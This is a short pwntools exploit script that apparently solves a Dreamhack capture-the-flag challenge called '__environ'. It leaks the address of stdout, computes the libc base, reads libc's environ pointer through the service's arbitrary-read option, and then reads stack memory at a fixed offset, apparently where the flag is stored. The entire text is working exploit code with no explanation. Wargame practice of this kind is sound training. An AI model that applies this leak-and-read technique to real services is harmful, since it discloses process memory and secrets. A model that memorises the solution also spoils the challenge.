from pwn import *

port = 18136
rem = remote("host3.dreamhack.games", port)

lib = ELF("./Pwnable/__environ/problem/libc.so.6")

rem.recvuntil(b"stdout: ")

stdout_addr = int(rem.recvn(14)[2:].decode(), 16)
lib_base = stdout_addr - lib.symbols['_IO_2_1_stdout_']
environ_addr = lib_base + lib.symbols['environ']

rem.sendlineafter(b"> ", b"1")
rem.sendlineafter(b"Addr: ", str(environ_addr).encode())
environ_val = u64(rem.recvn(6) + b'\x00' * 2)

rem.sendlineafter(b"> ", b"1")
rem.sendlineafter(b"Addr: ", str(environ_val - 5480).encode())
print(rem.recvline())